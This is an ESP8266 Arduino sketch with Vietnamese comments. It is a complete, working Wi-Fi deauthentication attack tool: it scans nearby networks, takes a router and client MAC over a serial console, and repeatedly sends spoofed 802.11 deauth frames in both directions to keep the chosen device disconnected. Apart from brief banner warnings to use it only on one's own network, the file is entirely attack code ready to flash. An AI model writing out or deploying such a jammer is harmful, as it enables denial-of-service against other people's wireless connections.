#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"  // Dùng để gửi gói tin raw (wifi_send_pkt_freedom)
}

// Mẫu gói deauth frame (26 bytes) - Đây là gói ngắt kết nối WiFi
uint8_t goiDeauth[26] = {
  0xC0, 0x00,                          // Loại gói: Deauthentication
  0x00, 0x00,                          // Thời gian
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Đích (Receiver) - sẽ thay bằng MAC client
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Nguồn (Source) - giả mạo từ AP
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (MAC của AP)
  0x00, 0x00,                          // Số thứ tự
  0x07, 0x00                           // Lý do: 7 (thiết bị không liên kết)
};

String maAP = "";          // MAC của Access Point (router)
String maClient = "";      // MAC của thiết bị cần ngắt (client)
bool dangTanCong = false;
int tocDoGoi = 50;         // Số gói/giây (càng cao càng mạnh, nhưng ESP có thể nóng)

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println("\n=== Công cụ Test Deauth ESP8266 - CHỈ DÙNG CHO MẠNG NHÀ BẠN ===");
  Serial.println("Cảnh báo: Chỉ test trên router và thiết bị của chính bạn!");
  Serial.println("Sử dụng sai mục đích là vi phạm pháp luật (Luật An ninh mạng VN).");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  Serial.println("\nCác lệnh có thể dùng (gõ rồi Enter):");
  Serial.println("  quet           - Quét WiFi xung quanh và liệt kê MAC");
  Serial.println("  setap <MAC>    - Đặt MAC router (ví dụ: setap 12:34:56:78:9A:BC)");
  Serial.println("  setclient <MAC> - Đặt MAC thiết bị cần test (điện thoại, laptop...)");
  Serial.println("  batdau         - Bắt đầu tấn công deauth vào client này");
  Serial.println("  dung           - Dừng tấn công");
  Serial.println("  trangthai      - Xem tình trạng hiện tại");
  Serial.println("  thoat          - Thoát chế độ (nhưng vẫn chạy)");
}

void loop() {
  if (Serial.available() > 0) {
    String lenh = Serial.readStringUntil('\n');
    lenh.trim();
    lenh.toLowerCase();

    if (lenh == "quet") {
      quetMangWiFi();
    } else if (lenh.startsWith("setap ")) {
      maAP = lenh.substring(6);
      maAP.trim();
      Serial.print("Đã đặt MAC AP (router): ");
      Serial.println(maAP);
    } else if (lenh.startsWith("setclient ")) {
      maClient = lenh.substring(10);
      maClient.trim();
      Serial.print("Đã đặt MAC client (thiết bị): ");
      Serial.println(maClient);
    } else if (lenh == "batdau") {
      if (maAP.length() == 17 && maClient.length() == 17) {
        dangTanCong = true;
        Serial.println("=== BẮT ĐẦU TẤN CÔNG DEAUTH VÀO CLIENT CỤ THỂ ===");
        Serial.print("Router: "); Serial.println(maAP);
        Serial.print("Thiết bị: "); Serial.println(maClient);
        Serial.println("Thiết bị sẽ bị ngắt kết nối WiFi liên tục!");
      } else {
        Serial.println("Lỗi: MAC phải đúng định dạng XX:XX:XX:XX:XX:XX");
      }
    } else if (lenh == "dung") {
      dangTanCong = false;
      Serial.println("Đã dừng tấn công.");
    } else if (lenh == "trangthai") {
      Serial.print("Trạng thái: ");
      Serial.println(dangTanCong ? "Đang tấn công" : "Đã dừng");
      Serial.print("Router: "); Serial.println(maAP != "" ? maAP : "Chưa đặt");
      Serial.print("Thiết bị: "); Serial.println(maClient != "" ? maClient : "Chưa đặt");
    }
  }

  if (dangTanCong) {
    guiGoiDeauth();
    delay(1000 / tocDoGoi);  // Điều chỉnh tốc độ gửi gói
  }
}

// Hàm quét mạng WiFi xung quanh
void quetMangWiFi() {
  Serial.println("Đang quét WiFi xung quanh... chờ chút");
  int soMang = WiFi.scanNetworks();
  if (soMang == 0) {
    Serial.println("Không tìm thấy mạng nào.");
  } else {
    Serial.print("Tìm thấy "); Serial.print(soMang); Serial.println(" mạng:");
    for (int i = 0; i < soMang; ++i) {
      Serial.printf("%2d | %-25s | MAC: %s | Sóng: %d dBm | Kênh: %d\n",
                    i + 1, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.RSSI(i), WiFi.channel(i));
    }
    Serial.println("\nCopy MAC (BSSID) của router rồi gõ: setap <MAC>");
  }
  WiFi.scanDelete();
}

// Chuyển chuỗi MAC (XX:XX:XX:XX:XX:XX) thành mảng byte
bool chuyenMAC(String chuoiMAC, uint8_t* mangMAC) {
  if (chuoiMAC.length() != 17) return false;
  char buf[18];
  chuoiMAC.toCharArray(buf, 18);
  return sscanf(buf, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &mangMAC[0], &mangMAC[1], &mangMAC[2],
                &mangMAC[3], &mangMAC[4], &mangMAC[5]) == 6;
}

// Gửi gói deauth chỉ vào client cụ thể
void guiGoiDeauth() {
  uint8_t macAP[6];
  uint8_t macClient[6];

  if (!chuyenMAC(maAP, macAP) || !chuyenMAC(maClient, macClient)) {
    Serial.println("MAC không hợp lệ! Dừng tấn công.");
    dangTanCong = false;
    return;
  }

  // Receiver = MAC client (đích cần ngắt)
  memcpy(&goiDeauth[4], macClient, 6);

  // Source = MAC router (giả mạo)
  memcpy(&goiDeauth[10], macAP, 6);

  // BSSID = MAC router
  memcpy(&goiDeauth[16], macAP, 6);

  // Gửi gói từ router → client
  wifi_send_pkt_freedom(goiDeauth, 26, 0);

  // Gửi ngược lại (client → router) để tăng hiệu quả
  memcpy(&goiDeauth[4], macAP, 6);
  memcpy(&goiDeauth[10], macClient, 6);
  memcpy(&goiDeauth[16], macAP, 6);
  wifi_send_pkt_freedom(goiDeauth, 26, 0);

  static int dem = 0;
  dem++;
  if (dem % 20 == 0) {
    Serial.print("Đã gửi "); Serial.print(dem * 2); Serial.println(" gói deauth");
  }
}
